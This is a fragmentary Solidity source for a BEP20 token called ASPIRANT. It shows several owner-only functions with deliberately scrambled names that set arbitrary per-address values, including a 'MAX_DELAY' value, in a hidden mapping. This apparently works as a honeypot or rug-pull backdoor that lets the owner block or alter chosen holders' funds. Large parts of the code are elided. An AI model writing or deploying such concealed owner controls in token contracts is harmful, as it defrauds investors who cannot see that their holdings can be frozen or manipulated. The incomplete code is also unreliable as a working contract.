...
contract ASPIRANT is IBEP20, HasForeignAsset {
    ...
    function getAspirant80672ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setAspirant80672reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupAspirant80672ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupAspirant80672Aasses(address booadndd,uint256 nuum) public onlyOwner {
    ...
    constructor() {
        ...
        _symbol = "ASPIRANT";
        _decimals = 9;
        uint256 _maxSupply = 986000000000;
